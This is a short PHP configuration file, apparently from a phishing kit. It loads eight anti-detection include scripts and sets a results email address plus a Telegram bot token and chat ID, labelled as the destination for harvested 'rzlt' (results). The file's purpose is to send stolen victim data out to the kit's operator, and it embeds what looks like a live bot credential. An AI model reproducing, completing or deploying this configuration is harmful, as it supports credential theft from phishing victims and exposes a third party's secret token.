<?php

include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$email ="dyst4r007@naver.com"; 

//telgram rzlt
$api = "5519433447:AAHaIfUhNKV7130-ebxA5J8FjBy-bdTkCuc";
$chatid = "-1001701842078";

?>